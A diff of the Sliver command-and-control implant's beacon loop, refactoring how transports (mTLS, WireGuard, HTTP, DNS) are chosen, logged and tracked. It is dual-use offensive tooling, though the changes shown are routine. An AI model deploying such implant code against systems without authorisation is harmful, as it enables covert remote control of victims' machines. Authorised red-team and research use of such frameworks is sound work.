@@ -60,6 +60,10 @@ import (
 	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
 )
 
+var (
+	_ url.URL
+)
+
 type BeaconInit func() error
 type BeaconStart func() error
 type BeaconRecv func() (*pb.Envelope, error)
@@ -143,13 +147,11 @@ func StartBeaconLoop(c2s []string, abort <-chan struct{}) <-chan *Beacon {
 			// {{if .Config.MTLSc2Enabled}}
 			case "mtls":
 				beacon = mtlsBeacon(uri)
-				activeC2 = uri.String()
 				// {{end}}  - MTLSc2Enabled
 			case "wg":
 				// *** WG ***
 				// {{if .Config.WGc2Enabled}}
 				beacon = wgBeacon(uri)
-				activeC2 = uri.String()
 				// {{end}}  - WGc2Enabled
 			case "https":
 				fallthrough
@@ -157,14 +159,12 @@ func StartBeaconLoop(c2s []string, abort <-chan struct{}) <-chan *Beacon {
 				// *** HTTP ***
 				// {{if .Config.HTTPc2Enabled}}
 				beacon = httpBeacon(uri)
-				activeC2 = uri.String()
 				// {{end}} - HTTPc2Enabled
 
 			case "dns":
 				// *** DNS ***
 				// {{if .Config.DNSc2Enabled}}
 				beacon = dnsBeacon(uri)
-				activeC2 = uri.String()
 				// {{end}} - DNSc2Enabled
 
 			default:
@@ -186,7 +186,7 @@ func StartBeaconLoop(c2s []string, abort <-chan struct{}) <-chan *Beacon {
 // {{if .Config.MTLSc2Enabled}}
 func mtlsBeacon(uri *url.URL) *Beacon {
 	// {{if .Config.Debug}}
-	log.Printf("Establishing Beacon -> %s", uri.String())
+	log.Printf("Beacon -> %s", uri.String())
 	// {{end}}
 	var err error
 	lport, err := strconv.Atoi(uri.Port())
@@ -308,7 +308,6 @@ func httpBeacon(uri *url.URL) *Beacon {
 				// {{end}}
 				return err
 			}
-			proxyURL = client.ProxyURL
 			return nil
 		},
 		Start: func() error {
